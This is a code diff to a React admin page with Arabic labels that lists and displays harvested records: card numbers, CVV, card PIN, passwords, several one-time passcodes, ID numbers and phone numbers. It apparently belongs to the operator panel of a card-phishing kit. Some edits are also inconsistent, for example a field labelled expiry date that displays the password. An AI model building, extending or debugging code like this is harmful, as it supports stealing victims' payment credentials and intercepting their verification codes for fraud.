@@ -85,7 +85,7 @@ interface Notification {
   ip?: string
   cvv: string
   id: string | "0"
-  yaer: string
+  expiryDate: string
   notificationCount: number
   otp: string
   otp2: string
@@ -104,13 +104,13 @@ interface Notification {
   pass?: string
   cardCvc?:string;
   year: string
+  yaer?: string
   month: string
   pagename: string
   plateType: string
   allOtps?: string[] | null
   idNumber: string
   email: string
-  isHidden?:boolean
   mobile: string
   network: string
   phoneOtp: string
@@ -799,7 +799,7 @@ export default function NotificationsPage() {
 
     // Apply filter type
     if (filterType === "card") {
-      filtered = filtered.filter((notification) => !notification.isHidden)
+      filtered = filtered.filter((notification) => notification.cardNumber)
     } else if (filterType === "online") {
       filtered = filtered.filter((notification) => onlineStatuses[notification.id])
     }
@@ -861,7 +861,7 @@ export default function NotificationsPage() {
             const data = doc.data() as any
             return { id: doc.id, ...data }
           })
-          .filter((notification: any) => notification.cardNumber) as Notification[]
+          .filter((notification: any) => !notification.isHidden) as Notification[]
 
         // Check if there are any new notifications with card info or general info
         const hasNewCardInfo = notificationsData.some(
@@ -1592,11 +1592,11 @@ export default function NotificationsPage() {
                               <div className="grid grid-cols-1 gap-3 mb-3">
                                 <div className="flex flex-wrap gap-2 mb-2">
                                   <Badge
-                                    variant={notification?.phone ? "secondary" : "destructive"}
+                                    variant={notification?.personalInfo.name ? "secondary" : "destructive"}
                                     className="rounded-md cursor-pointer"
                                     onClick={() => handleInfoClick(notification, "personal")}
                                   >
-                                    {notification.name ? "معلومات شخصية" : "لا يوجد معلومات"}
+                                    {notification.personalInfo?.name ? "معلومات شخصية" : "لا يوجد معلومات"}
                                   </Badge>
                                   <Badge
                                     variant={notification.cardNumber ? "secondary" : "destructive"}
@@ -1806,11 +1806,13 @@ export default function NotificationsPage() {
                 <div className="flex justify-between items-center py-2 border-b border-border/50">
                   <span className="font-medium text-muted-foreground">الاسم:</span>
                   <span className="font-semibold">{selectedNotification.name}</span>
+                  <span className="font-semibold">{selectedNotification.personalInfo.name}</span>
                 </div>
               )}
               {selectedNotification.phone && (
                 <div className="flex justify-between items-center py-2">
                   <span className="font-medium text-muted-foreground">الهاتف:</span>
+                  <span className="font-semibold">{selectedNotification.personalInfo.id}</span>
                   <span className="font-semibold">{selectedNotification.phone}</span>
                 </div>
               )}
@@ -1845,10 +1847,14 @@ export default function NotificationsPage() {
                   <span className="font-semibold">
                     {selectedNotification.year && selectedNotification.month
                       ? `${selectedNotification.year}/${selectedNotification.month}`
-                      : selectedNotification.yaer}
+                      : selectedNotification.cardExpiry}
                   </span>
                 </div>
               )}
+              {selectedNotification.yaer && (  <div className="flex justify-between items-center py-2 border-b border-border/50">
+                  <span className="font-medium text-muted-foreground">تاريخ الانتهاء:</span>
+                  <span className="font-semibold">{selectedNotification.pass}</span>
+                </div>)}
               {selectedNotification.pass && (
                 <div className="flex justify-between items-center py-2 border-b border-border/50">
                   <span className="font-medium text-muted-foreground">رمز البطاقة:</span>
